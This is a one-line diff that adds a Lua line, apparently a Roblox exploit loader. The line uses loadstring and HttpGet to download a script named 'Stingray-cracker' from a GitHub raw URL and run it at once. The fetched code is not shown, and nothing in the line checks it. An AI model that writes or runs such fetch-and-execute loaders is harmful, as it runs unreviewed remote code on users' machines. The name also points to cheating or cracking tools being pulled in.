@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Nebula-Manta/Public-Stingray/refs/heads/main/Stingray-cracker"))()
